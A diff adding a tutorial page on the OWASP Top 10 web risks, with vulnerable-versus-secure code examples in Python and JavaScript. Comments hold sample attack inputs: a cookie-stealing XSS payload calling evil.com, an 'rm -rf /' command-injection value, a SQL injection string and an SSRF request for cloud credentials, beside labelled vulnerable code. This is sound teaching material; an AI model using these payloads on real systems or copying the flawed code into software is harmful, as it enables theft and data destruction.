@@ -1,0 +1,741 @@
+---
+title: "OWASP Top 10"
+description: "Understand and prevent the most critical web application security vulnerabilities"
+difficulty: "intermediate"
+prerequisites: ["Security Fundamentals", "HTTP & HTTPS"]
+timeToRead: "25 min"
+topics: ["owasp", "xss", "sql-injection", "csrf", "injection", "broken-auth"]
+---
+
+import { Tabs, TabItem, LinkCard, CardGrid } from '@astrojs/starlight/components';
+
+The **OWASP Top 10** is the most widely recognized list of critical web application security risks, published by the Open Web Application Security Project (OWASP). Updated periodically based on real-world vulnerability data from hundreds of organizations, it serves as a **standard awareness document** that every web developer should know by heart.
+
+The 2021 edition reflects the evolving threat landscape, with new categories like **Insecure Design** and **Software and Data Integrity Failures** acknowledging that security must be considered at every phase of the software development lifecycle -- not just at the code level.
+
+---
+
+## A01: Broken Access Control
+
+**Moved up from #5 to #1.** This is the most serious risk in modern web applications. Broken access control means users can act outside their intended permissions -- viewing other users' data, modifying records they should not, or escalating their privilege level.
+
+### How It Happens
+
+- Missing authorization checks on API endpoints
+- Insecure Direct Object References (IDOR) -- manipulating IDs in URLs or request bodies
+- CORS misconfiguration allowing unauthorized origins
+- Bypassing access controls by modifying URLs, HTML, or API requests
+- Missing function-level access control (admin endpoints accessible to regular users)
+
+### Vulnerable vs Secure Code
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: No authorization check -- any user can view any profile
+@app.route("/api/users/<user_id>/profile")
+def get_profile(user_id):
+    user = db.query(User).get(user_id)
+    return jsonify(user.to_dict())
+
+
+# SECURE: Verify the requesting user is authorized
+@app.route("/api/users/<user_id>/profile")
+@login_required
+def get_profile(user_id):
+    current_user = get_current_user()
+
+    # Users can only view their own profile (or admins can view any)
+    if str(current_user.id) != user_id and not current_user.is_admin:
+        abort(403, description="You do not have permission to view this profile")
+
+    user = db.query(User).get(user_id)
+    if not user:
+        abort(404, description="User not found")
+
+    return jsonify(user.to_dict())
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: No authorization check -- any user can view any profile
+app.get("/api/users/:userId/profile", async (req, res) => {
+  const user = await User.findById(req.params.userId);
+  res.json(user);
+});
+
+
+// SECURE: Verify the requesting user is authorized
+app.get("/api/users/:userId/profile", authenticate, async (req, res) => {
+  const currentUser = req.user;
+
+  // Users can only view their own profile (or admins can view any)
+  if (currentUser.id !== req.params.userId && !currentUser.isAdmin) {
+    return res.status(403).json({ error: "You do not have permission to view this profile" });
+  }
+
+  const user = await User.findById(req.params.userId);
+  if (!user) {
+    return res.status(404).json({ error: "User not found" });
+  }
+
+  res.json(user);
+});
+```
+  </TabItem>
+</Tabs>
+
+### Prevention
+
+- **Deny by default** -- every endpoint should require explicit authorization
+- Implement **server-side** access control checks (never rely on client-side controls)
+- Use **indirect references** (e.g., map user-specific IDs rather than exposing database PKs)
+- **Log access control failures** and alert on repeated violations
+- **Rate limit API access** to minimize automated exploitation
+- Disable web server directory listing and remove metadata files (`.git`, `.env`) from the web root
+
+---
+
+## A02: Cryptographic Failures
+
+Previously known as "Sensitive Data Exposure," this category focuses on failures in cryptography that lead to exposure of sensitive data.
+
+### How It Happens
+
+- Transmitting data in clear text (HTTP, FTP, SMTP without TLS)
+- Using deprecated or weak cryptographic algorithms (MD5, SHA-1, DES)
+- Using default or weak encryption keys
+- Not enforcing HTTPS via HSTS headers
+- Storing passwords in plain text or using unsalted hashes
+- Using random number generators that are not cryptographically secure
+
+### Common Mistakes and Fixes
+
+| Mistake | Risk | Fix |
+|---------|------|-----|
+| Storing passwords with MD5/SHA-1 | Rainbow table attacks crack them in seconds | Use bcrypt, scrypt, or Argon2 with unique salts |
+| Using HTTP for login forms | Credentials sent in plain text | Enforce HTTPS everywhere with HSTS |
+| Hardcoded encryption keys | Key exposed in source code or version control | Use a secrets manager (Vault, AWS KMS) |
+| Using `Math.random()` for tokens | Predictable output | Use `crypto.randomBytes()` or `secrets.token_hex()` |
+| Not rotating keys | Prolonged exposure from a single breach | Implement key rotation policies |
+
+### Prevention
+
+- **Classify data** -- identify what is sensitive and apply appropriate protections
+- **Encrypt data in transit** with TLS 1.2+ and enforce via HSTS
+- **Encrypt data at rest** with AES-256 and manage keys securely
+- **Use strong password hashing** (bcrypt, Argon2id) with unique per-user salts
+- **Disable caching** for responses containing sensitive data
+- **Never store sensitive data you do not need** -- if you do not collect it, you cannot leak it
+
+---
+
+## A03: Injection
+
+Injection flaws occur when **untrusted data is sent to an interpreter** as part of a command or query. SQL injection, XSS, and command injection are the most common variants.
+
+### SQL Injection
+
+The attacker inserts malicious SQL into a query through user input.
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: String concatenation in SQL query
+@app.route("/api/users")
+def search_users():
+    username = request.args.get("username")
+    # NEVER DO THIS -- attacker can send: ' OR '1'='1' --
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    results = db.execute(query)
+    return jsonify([dict(row) for row in results])
+
+
+# SECURE: Parameterized query
+@app.route("/api/users")
+def search_users():
+    username = request.args.get("username")
+    # The database driver safely escapes the parameter
+    query = "SELECT * FROM users WHERE username = %s"
+    results = db.execute(query, (username,))
+    return jsonify([dict(row) for row in results])
+
+
+# EVEN BETTER: Use an ORM (SQLAlchemy)
+@app.route("/api/users")
+def search_users():
+    username = request.args.get("username")
+    users = User.query.filter_by(username=username).all()
+    return jsonify([user.to_dict() for user in users])
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: String concatenation in SQL query
+app.get("/api/users", async (req, res) => {
+  const { username } = req.query;
+  // NEVER DO THIS -- attacker can send: ' OR '1'='1' --
+  const query = `SELECT * FROM users WHERE username = '${username}'`;
+  const results = await db.query(query);
+  res.json(results.rows);
+});
+
+
+// SECURE: Parameterized query
+app.get("/api/users", async (req, res) => {
+  const { username } = req.query;
+  // The database driver safely escapes the parameter
+  const query = "SELECT * FROM users WHERE username = $1";
+  const results = await db.query(query, [username]);
+  res.json(results.rows);
+});
+
+
+// EVEN BETTER: Use an ORM (Prisma)
+app.get("/api/users", async (req, res) => {
+  const { username } = req.query;
+  const users = await prisma.user.findMany({
+    where: { username },
+  });
+  res.json(users);
+});
+```
+  </TabItem>
+</Tabs>
+
+### Cross-Site Scripting (XSS)
+
+The attacker injects malicious scripts into web pages viewed by other users.
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: Rendering user input without escaping
+@app.route("/profile")
+def profile():
+    name = request.args.get("name")
+    # If name is: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
+    return f"<h1>Welcome, {name}</h1>"
+
+
+# SECURE: Use a template engine that auto-escapes (Jinja2)
+@app.route("/profile")
+def profile():
+    name = request.args.get("name")
+    # Jinja2 auto-escapes HTML by default
+    return render_template("profile.html", name=name)
+
+# profile.html:
+# <h1>Welcome, {{ name }}</h1>
+# Output: <h1>Welcome, &lt;script&gt;...&lt;/script&gt;</h1>
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: Injecting user input directly into the DOM
+app.get("/profile", (req, res) => {
+  const name = req.query.name;
+  // If name is: <script>alert('XSS')</script>
+  res.send(`<h1>Welcome, ${name}</h1>`);
+});
+
+
+// SECURE: Escape HTML entities before rendering
+function escapeHtml(text) {
+  const map = {
+    "&": "&amp;", "<": "&lt;", ">": "&gt;",
+    '"': "&quot;", "'": "&#039;",
+  };
+  return text.replace(/[&<>"']/g, (char) => map[char]);
+}
+
+app.get("/profile", (req, res) => {
+  const name = escapeHtml(req.query.name || "");
+  res.send(`<h1>Welcome, ${name}</h1>`);
+});
+
+
+// EVEN BETTER: Use a template engine with auto-escaping (EJS, Handlebars)
+// or a frontend framework (React, Vue) that escapes by default
+```
+  </TabItem>
+</Tabs>
+
+### Command Injection
+
+The attacker injects OS commands through application inputs.
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: Passing user input directly to shell
+import os
+
+@app.route("/api/ping")
+def ping():
+    host = request.args.get("host")
+    # Attacker sends: 127.0.0.1; rm -rf /
+    result = os.popen(f"ping -c 3 {host}").read()
+    return result
+
+
+# SECURE: Use subprocess with argument list (no shell interpretation)
+import subprocess
+import re
+
+@app.route("/api/ping")
+def ping():
+    host = request.args.get("host")
+
+    # Validate input format (allowlist approach)
+    if not re.match(r'^[\w.-]+$', host):
+        abort(400, description="Invalid hostname")
+
+    # subprocess with list arguments avoids shell injection
+    result = subprocess.run(
+        ["ping", "-c", "3", host],
+        capture_output=True, text=True, timeout=10
+    )
+    return result.stdout
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: Passing user input directly to shell
+const { exec } = require("child_process");
+
+app.get("/api/ping", (req, res) => {
+  const host = req.query.host;
+  // Attacker sends: 127.0.0.1; rm -rf /
+  exec(`ping -c 3 ${host}`, (error, stdout) => {
+    res.send(stdout);
+  });
+});
+
+
+// SECURE: Use execFile with argument array (no shell interpretation)
+const { execFile } = require("child_process");
+
+app.get("/api/ping", (req, res) => {
+  const host = req.query.host;
+
+  // Validate input format (allowlist approach)
+  if (!/^[\w.-]+$/.test(host)) {
+    return res.status(400).json({ error: "Invalid hostname" });
+  }
+
+  // execFile does not spawn a shell, preventing injection
+  execFile("ping", ["-c", "3", host], { timeout: 10000 }, (error, stdout) => {
+    if (error) {
+      return res.status(500).json({ error: "Ping failed" });
+    }
+    res.send(stdout);
+  });
+});
+```
+  </TabItem>
+</Tabs>
+
+### Prevention (All Injection Types)
+
+- **Use parameterized queries** or prepared statements for all database operations
+- **Use ORMs** that handle escaping automatically
+- **Validate and sanitize all input** using allowlists (not denylists)
+- **Use template engines** with automatic output escaping for HTML rendering
+- **Avoid passing user input to OS commands** -- if unavoidable, use argument arrays and strict validation
+- **Implement Content Security Policy (CSP)** headers to mitigate XSS impact
+
+---
+
+## A04: Insecure Design
+
+This is a new category in the 2021 edition. It focuses on **design-level flaws** that cannot be fixed by perfect implementation. An insecure design is fundamentally different from an insecure implementation -- you cannot fix a bad design with good code.
+
+### Examples
+
+- A password recovery flow that uses "security questions" with publicly available answers
+- A checkout system that trusts client-side price calculations
+- An API that has no rate limiting on authentication endpoints (enabling brute force)
+- A system that stores all user data in a single database with no segmentation
+
+### Prevention
+
+- **Threat model** during the design phase -- use STRIDE to identify risks before writing code
+- **Use secure design patterns** (e.g., never trust client-side calculations, always validate on the server)
+- **Establish paved roads** -- provide developers with secure libraries, frameworks, and templates
+- **Define abuse cases** alongside use cases -- what would an attacker try?
+- **Limit resource consumption** by design (rate limiting, pagination, upload size limits)
+
+---
+
+## A05: Security Misconfiguration
+
+The most commonly seen issue in real-world deployments. Systems are insecure not because of code flaws but because of **incorrect or missing configuration**.
+
+### Common Misconfigurations
+
+| Misconfiguration | Risk | Fix |
+|-----------------|------|-----|
+| Default credentials on databases/admin panels | Immediate full access | Change defaults before deployment, enforce strong passwords |
+| Debug mode enabled in production | Stack traces reveal internals | Environment-based configuration: `DEBUG=false` in production |
+| Unnecessary services or ports open | Expanded attack surface | Disable or remove everything not explicitly needed |
+| Missing security headers | XSS, clickjacking, MIME sniffing | Add CSP, HSTS, X-Frame-Options, X-Content-Type-Options |
+| Overly permissive CORS | Cross-origin data theft | Restrict `Access-Control-Allow-Origin` to known domains |
+| Cloud storage (S3) publicly accessible | Data exposure | Set buckets to private, use IAM policies for access |
+| Verbose error messages | Information disclosure | Return generic errors to users, log details server-side |
+
+### Prevention
+
+- **Implement a repeatable hardening process** -- automate configuration with IaC (Terraform, Ansible)
+- **Use minimal platform** -- remove unused features, frameworks, and dependencies
+- **Review and update configurations** as part of the patch management process
+- **Send security headers** from your web server or application
+- **Use automated scanners** to detect misconfigurations (e.g., ScoutSuite for cloud, nikto for web servers)
+
+---
+
+## A06: Vulnerable and Outdated Components
+
+Using components (libraries, frameworks, dependencies) with **known vulnerabilities** is one of the easiest attack vectors to exploit because public exploits are often available.
+
+### The Supply Chain Risk
+
+```
+Your Application
+    ├── express@4.17.1
+    │   ├── body-parser@1.19.0
+    │   │   └── qs@6.7.0 (known CVE!)
+    │   └── ...
+    ├── lodash@4.17.15 (known CVE!)
+    └── jsonwebtoken@8.5.0
+        └── jws@3.2.2 (known CVE!)
+```
+
+A single vulnerable transitive dependency can compromise your entire application.
+
+### Prevention
+
+- **Inventory your dependencies** -- know every direct and transitive dependency
+- **Continuously monitor** for new CVEs using `npm audit`, `pip-audit`, `cargo audit`, or Snyk
+- **Automate updates** with tools like Dependabot, Renovate, or Mend
+- **Remove unused dependencies** -- every dependency is a liability
+- **Subscribe to security advisories** for your key frameworks and libraries
+- **Use lockfiles** (`package-lock.json`, `Pipfile.lock`) to ensure reproducible builds
+
+---
+
+## A07: Identification and Authentication Failures
+
+Weaknesses in authentication mechanisms that allow attackers to assume other users' identities.
+
+### Common Weaknesses
+
+- Permitting brute force attacks (no rate limiting or account lockout)
+- Allowing weak passwords ("password123", "admin")
+- Using insecure password recovery (email-only, guessable security questions)
+- Storing passwords in plain text or with weak hashing (MD5, SHA-1)
+- Missing multi-factor authentication (MFA) for sensitive operations
+- Session IDs exposed in URLs
+- Session tokens that do not expire or are not invalidated on logout
+
+### Prevention
+
+- **Implement multi-factor authentication** for all critical accounts and operations
+- **Enforce strong password policies** (minimum 12 characters, check against breached password lists)
+- **Use strong password hashing** -- bcrypt, scrypt, or Argon2id with appropriate cost factors
+- **Rate limit authentication endpoints** -- use exponential backoff and account lockout
+- **Generate high-entropy session tokens** server-side using cryptographic randomness
+- **Invalidate sessions** on logout, password change, and after a reasonable timeout
+- **Never expose session IDs in URLs**
+
+---
+
+## A08: Software and Data Integrity Failures
+
+This category addresses failures to verify the integrity of software updates, critical data, and CI/CD pipelines. It includes the former "Insecure Deserialization" category.
+
+### Examples
+
+- Using libraries from untrusted sources without verifying checksums or signatures
+- Auto-update mechanisms that download updates without integrity verification
+- Insecure CI/CD pipelines where an attacker can inject malicious code
+- Insecure deserialization -- accepting serialized objects from untrusted sources
+
+### Insecure Deserialization Example
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: Deserializing untrusted data with pickle
+import pickle
+
+@app.route("/api/import", methods=["POST"])
+def import_data():
+    # pickle.loads can execute arbitrary code!
+    data = pickle.loads(request.data)
+    return jsonify(data)
+
+
+# SECURE: Use safe serialization formats (JSON)
+import json
+
+@app.route("/api/import", methods=["POST"])
+def import_data():
+    try:
+        data = json.loads(request.data)
+        # Validate the data structure against a schema
+        validate(data, IMPORT_SCHEMA)
+        return jsonify(data)
+    except (json.JSONDecodeError, ValidationError) as e:
+        abort(400, description="Invalid data format")
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: Using eval to parse data (never do this)
+app.post("/api/import", (req, res) => {
+  // eval can execute arbitrary code!
+  const data = eval("(" + req.body.data + ")");
+  res.json(data);
+});
+
+
+// SECURE: Use JSON.parse with validation
+const Ajv = require("ajv");
+const ajv = new Ajv();
+
+app.post("/api/import", (req, res) => {
+  try {
+    const data = JSON.parse(req.body.data);
+
+    // Validate against a JSON schema
+    const valid = ajv.validate(importSchema, data);
+    if (!valid) {
+      return res.status(400).json({ error: "Invalid data format" });
+    }
+
+    res.json(data);
+  } catch (error) {
+    res.status(400).json({ error: "Invalid JSON" });
+  }
+});
+```
+  </TabItem>
+</Tabs>
+
+### Prevention
+
+- **Verify digital signatures** on software and data from external sources
+- **Use trusted repositories** and verify package integrity (checksums, signatures)
+- **Secure your CI/CD pipeline** -- require code review, signed commits, and build integrity verification
+- **Do not deserialize untrusted data** using unsafe mechanisms (pickle, Java serialization)
+- **Use Software Bill of Materials (SBOM)** tools to track components
+- **Implement Subresource Integrity (SRI)** for externally hosted scripts and styles
+
+---
+
+## A09: Security Logging and Monitoring Failures
+
+Without adequate logging and monitoring, breaches go **undetected for months**. The median time to detect a breach is **207 days** (IBM 2023 report).
+
+### What to Log
+
+| Event | Why |
+|-------|-----|
+| **Authentication attempts** (success and failure) | Detect brute force attacks |
+| **Authorization failures** (403 responses) | Detect privilege escalation attempts |
+| **Input validation failures** | Detect injection attempts |
+| **Application errors and exceptions** | Detect exploitation attempts |
+| **Administrative actions** | Maintain audit trail |
+| **Data access patterns** | Detect unusual data exfiltration |
+
+### What NOT to Log
+
+- **Passwords** (even failed ones)
+- **Credit card numbers** or full SSNs
+- **Session tokens** or API keys
+- **Personal health information** or other regulated PII
+- Any data that would create a **second breach target** in your log files
+
+### Prevention
+
+- **Log all security-relevant events** with sufficient context (who, what, when, where, outcome)
+- **Use structured logging** (JSON) with consistent schemas for easy querying
+- **Centralize logs** using a SIEM or log aggregation tool (ELK, Splunk, Datadog)
+- **Set up alerts** for suspicious patterns (multiple failed logins, unusual data access)
+- **Retain logs** for an appropriate period based on compliance requirements
+- **Test your alerting** -- run tabletop exercises to verify alerts trigger correctly
+
+---
+
+## A10: Server-Side Request Forgery (SSRF)
+
+SSRF occurs when an application **fetches a remote resource based on user-supplied input** without validating the destination. This allows attackers to make the server send requests to unintended locations -- including internal services, metadata endpoints, and local resources.
+
+### How It Happens
+
+```
+Attacker sends:
+  POST /api/fetch-url
+  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
+
+The server dutifully fetches the AWS metadata endpoint
+and returns IAM credentials to the attacker.
+```
+
+### Prevention
+
+<Tabs>
+  <TabItem label="Python">
+```python
+# VULNERABLE: Fetching any URL the user provides
+import requests
+
+@app.route("/api/fetch-url", methods=["POST"])
+def fetch_url():
+    url = request.json.get("url")
+    # Attacker can target internal services!
+    response = requests.get(url)
+    return response.text
+
+
+# SECURE: Validate and restrict the target URL
+from urllib.parse import urlparse
+import ipaddress
+
+ALLOWED_DOMAINS = {"api.example.com", "cdn.example.com"}
+
+def is_safe_url(url):
+    """Validate that the URL targets an allowed external domain."""
+    try:
+        parsed = urlparse(url)
+
+        # Only allow HTTPS
+        if parsed.scheme != "https":
+            return False
+
+        # Check against allowlist of domains
+        if parsed.hostname not in ALLOWED_DOMAINS:
+            return False
+
+        # Block private/internal IP ranges
+        try:
+            ip = ipaddress.ip_address(parsed.hostname)
+            if ip.is_private or ip.is_loopback or ip.is_link_local:
+                return False
+        except ValueError:
+            pass  # Hostname is not an IP -- domain allowlist handles it
+
+        return True
+    except Exception:
+        return False
+
+
+@app.route("/api/fetch-url", methods=["POST"])
+def fetch_url():
+    url = request.json.get("url")
+    if not is_safe_url(url):
+        abort(400, description="URL not allowed")
+
+    response = requests.get(url, timeout=5)
+    return response.text
+```
+  </TabItem>
+  <TabItem label="JavaScript">
+```javascript
+// VULNERABLE: Fetching any URL the user provides
+app.post("/api/fetch-url", async (req, res) => {
+  const { url } = req.body;
+  // Attacker can target internal services!
+  const response = await fetch(url);
+  const data = await response.text();
+  res.send(data);
+});
+
+
+// SECURE: Validate and restrict the target URL
+const ALLOWED_DOMAINS = new Set(["api.example.com", "cdn.example.com"]);
+
+function isSafeUrl(urlString) {
+  try {
+    const parsed = new URL(urlString);
+
+    // Only allow HTTPS
+    if (parsed.protocol !== "https:") return false;
+
+    // Check against allowlist of domains
+    if (!ALLOWED_DOMAINS.has(parsed.hostname)) return false;
+
+    // Block localhost and private ranges
+    const blockedPatterns = [
+      /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./,
+      /^169\.254\./, /^0\./, /^localhost$/i, /^::1$/, /^\[::1\]$/,
+    ];
+    if (blockedPatterns.some((p) => p.test(parsed.hostname))) return false;
+
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+app.post("/api/fetch-url", async (req, res) => {
+  const { url } = req.body;
+  if (!isSafeUrl(url)) {
+    return res.status(400).json({ error: "URL not allowed" });
+  }
+
+  const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
+  const data = await response.text();
+  res.send(data);
+});
+```
+  </TabItem>
+</Tabs>
+
+### Additional SSRF Prevention
+
+- **Use allowlists** for permitted domains and protocols -- never denylists alone
+- **Block access to internal networks** and cloud metadata endpoints at the network level
+- **Do not return raw responses** to clients -- parse and return only expected data
+- **Disable HTTP redirects** or re-validate after redirects
+- **Use network segmentation** to limit what the application server can reach
+
+---
+
+## OWASP Top 10 at a Glance
+
+| # | Category | Key Mitigation |
+|---|----------|---------------|
+| A01 | Broken Access Control | Deny by default, server-side checks, IDOR prevention |
+| A02 | Cryptographic Failures | TLS everywhere, strong hashing, proper key management |
+| A03 | Injection | Parameterized queries, output encoding, input validation |
+| A04 | Insecure Design | Threat modeling, abuse cases, secure design patterns |
+| A05 | Security Misconfiguration | Hardened defaults, automated configuration, minimal platform |
+| A06 | Vulnerable Components | Dependency scanning, automated updates, SBOM |
+| A07 | Auth Failures | MFA, strong hashing, rate limiting, session management |
+| A08 | Integrity Failures | Signature verification, secure CI/CD, safe deserialization |
+| A09 | Logging Failures | Centralized logging, alerting, structured log formats |
+| A10 | SSRF | URL allowlists, block internal networks, validate redirects |
+
+---
+
+## Next Steps
+
+<CardGrid>
+  <LinkCard
+    title="Authentication, Authorization & Encryption"
+    href="/software-engineering/security/auth-encryption/"
+    description="Deep dive into secure authentication patterns, OAuth 2.0, JWT, encryption, and hashing"
+  />
+  <LinkCard
+    title="Secure Coding Practices"
+    href="/software-engineering/security/secure-coding/"
+    description="Write secure code with input validation, secrets management, and dependency security"
+  />
+  <LinkCard
+    title="Security Fundamentals"
+    href="/software-engineering/security/"
+    description="Review the core security principles -- CIA triad, defense in depth, and threat modeling"
+  />
+</CardGrid>
